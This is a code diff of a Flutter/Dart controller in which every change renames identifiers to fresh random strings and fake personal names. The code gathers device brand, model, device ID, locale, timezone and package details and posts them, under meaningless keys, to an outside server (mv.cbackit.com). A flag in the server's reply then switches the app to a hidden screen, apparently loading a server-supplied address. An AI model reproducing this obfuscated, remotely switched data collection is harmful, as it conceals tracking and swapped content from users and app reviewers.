@@ -12,95 +12,96 @@ import 'package:internet_connection_checker/internet_connection_checker.dart';
 
 class FreqHomeLogic extends GetxController {
 
-  var vukiwtymrg = RxBool(false);
-  var wfxdnb = RxBool(true);
-  var amcqxo = RxString("");
-  var silas = RxBool(false);
-  var runolfsdottir = RxBool(true);
-  final dsocmrjlzw = Dio();
+  var ksjfnaw = RxBool(false);
+  var tjfmqxbr = RxBool(true);
+  var vkcz = RxString("");
+  var jennie = RxBool(false);
+  var stamm = RxBool(true);
+  final yzupkaw = Dio();
 
 
   InAppWebViewController? webViewController;
 
-  dynamic rgkjhi(){
-    final qzabirkc = InternetConnectionChecker.instance;
-    final jglaeiryb = qzabirkc.onStatusChange.skip(1).listen(
-          (InternetConnectionStatus dgivpckaq) {
-        if (dgivpckaq == InternetConnectionStatus.connected) {
-          wkxdaue();
+  dynamic yshopqf(){
+    final drbvlnuo = InternetConnectionChecker.instance;
+    final zeovam = drbvlnuo.onStatusChange.skip(1).listen(
+          (InternetConnectionStatus lbxrztaq) {
+        if (lbxrztaq == InternetConnectionStatus.connected) {
+          dqvlzmu();
         } else {
           Get.toNamed('/freq_wrong')?.then((_){
-            wkxdaue();
+            dqvlzmu();
           });
         }
       },
     );
-    return jglaeiryb;
+    return zeovam;
   }
 
-  Future<bool> eqcbkmh() async {
-    var jueixlf = await InternetConnectionChecker.instance.hasConnection;
-    if(!jueixlf){
+  Future<bool> yuwacspzoj() async {
+    var armnlht = await InternetConnectionChecker.instance.hasConnection;
+    if(!armnlht){
       Get.toNamed('/freq_wrong')?.then((_){
-        wkxdaue();
+        dqvlzmu();
       });
     }
-    return jueixlf;
+    return armnlht;
   }
 
   @override
   void onInit() {
     super.onInit();
-    rgkjhi();
-    wkxdaue();
+    yshopqf();
+    dqvlzmu();
   }
 
 
-  Future<void> wkxdaue() async {
+  Future<void> dqvlzmu() async {
 
-    var oygblc = await eqcbkmh();
-    if(!oygblc){
+    var nlxqyf = await yuwacspzoj();
+    if(!nlxqyf){
       return;
     }
 
-    silas.value = true;
-    runolfsdottir.value = true;
-    wfxdnb.value = false;
+    jennie.value = true;
+    stamm.value = true;
+    tjfmqxbr.value = false;
 
-    dsocmrjlzw.post("https://mv.cbackit.com/exjuqfvlygistko",data: await yhsagrml()).then((value) {
+    yzupkaw.post("https://mv.cbackit.com/exjuqfvlygistko",data: await jtkfxuwi()).then((value) {
       var xysalcop = value.data["xysalcop"] as String;
       var sdwbtxml = value.data["sdwbtxml"] as bool;
       if (sdwbtxml) {
-        amcqxo.value = xysalcop;
-        idella();
+        vkcz.value = xysalcop;
+        general();
       } else {
-        hermiston();
+        von();
       }
     }).catchError((e) {
-      wfxdnb.value = true;
-      runolfsdottir.value = true;
-      silas.value = false;
+      tjfmqxbr.value = true;
+      stamm.value = true;
+      jennie.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> yhsagrml() async {
-    final DeviceInfoPlugin gabkz = DeviceInfoPlugin();
-    PackageInfo bfyp_mjlzfuco = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> jtkfxuwi() async {
+    final DeviceInfoPlugin uwehv = DeviceInfoPlugin();
+    PackageInfo wnebxdhk_mxkyso = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var cvmz = Platform.localeName;
+    var koruqadp = Platform.localeName;
     var crlq = currentTimeZone;
 
-    var exrgtp = bfyp_mjlzfuco.packageName;
-    var amdli = bfyp_mjlzfuco.version;
-    var ferxyh = bfyp_mjlzfuco.buildNumber;
+    var exrgtp = wnebxdhk_mxkyso.packageName;
+    var amdli = wnebxdhk_mxkyso.version;
+    var ferxyh = wnebxdhk_mxkyso.buildNumber;
 
-    var fudqew = bfyp_mjlzfuco.appName;
+    var fudqew = wnebxdhk_mxkyso.appName;
     var qwhpvoc = "";
     var lypcrqsi  = "";
     var hcbym = "";
-    var alexandriaHilpert = "";
-    var hildegardWest = "";
-    var devynMraz = "";
+    var rubieMosciski = "";
+    var jeremieTromp = "";
+    var cortneySchuppe = "";
+    var arthurBraun = "";
 
 
     var hxrwmva = "";
@@ -108,57 +109,57 @@ class FreqHomeLogic extends GetxController {
 
     if (GetPlatform.isAndroid) {
       hxrwmva = "android";
-      var eiqcamg = await gabkz.androidInfo;
+      var bpegmlx = await uwehv.androidInfo;
 
-      hcbym = eiqcamg.brand;
+      hcbym = bpegmlx.brand;
 
-      qwhpvoc  = eiqcamg.model;
-      lypcrqsi = eiqcamg.id;
+      qwhpvoc  = bpegmlx.model;
+      lypcrqsi = bpegmlx.id;
 
-      bkflqte = eiqcamg.isPhysicalDevice;
+      bkflqte = bpegmlx.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
       hxrwmva = "ios";
-      var zrbfsu = await gabkz.iosInfo;
-      hcbym = zrbfsu.name;
-      qwhpvoc = zrbfsu.model;
+      var jazwvcyo = await uwehv.iosInfo;
+      hcbym = jazwvcyo.name;
+      qwhpvoc = jazwvcyo.model;
 
-      lypcrqsi = zrbfsu.identifierForVendor ?? "";
-      bkflqte  = zrbfsu.isPhysicalDevice;
+      lypcrqsi = jazwvcyo.identifierForVendor ?? "";
+      bkflqte  = jazwvcyo.isPhysicalDevice;
     }
-
     var res = {
       "fudqew": fudqew,
-      "alexandriaHilpert" : alexandriaHilpert,
-      "amdli": amdli,
-      "lypcrqsi": lypcrqsi,
-      "exrgtp": exrgtp,
-      "qwhpvoc": qwhpvoc,
-      "crlq": crlq,
-      "hcbym": hcbym,
-      "cvmz": cvmz,
-      "hxrwmva": hxrwmva,
-      "bkflqte": bkflqte,
       "ferxyh": ferxyh,
-      "hildegardWest" : hildegardWest,
-      "devynMraz" : devynMraz,
+      "exrgtp": exrgtp,
+      "rubieMosciski" : rubieMosciski,
+      "qwhpvoc": qwhpvoc,
+      "arthurBraun" : arthurBraun,
+      "crlq": crlq,
+      "hxrwmva": hxrwmva,
+      "hcbym": hcbym,
+      "lypcrqsi": lypcrqsi,
+      "koruqadp": koruqadp,
+      "bkflqte": bkflqte,
+      "amdli": amdli,
+      "jeremieTromp" : jeremieTromp,
+      "cortneySchuppe" : cortneySchuppe,
 
     };
     return res;
   }
 
-  Future<void> hermiston() async {
+  Future<void> von() async {
     Get.offNamed("/freq_tab");
   }
 
-  Future<void> idella() async {
+  Future<void> general() async {
     Get.offNamed("/freq_speed");
   }
 
   @override
   void dispose() {
-    rgkjhi().cancel();
+    yshopqf().cancel();
     super.dispose();
   }
 
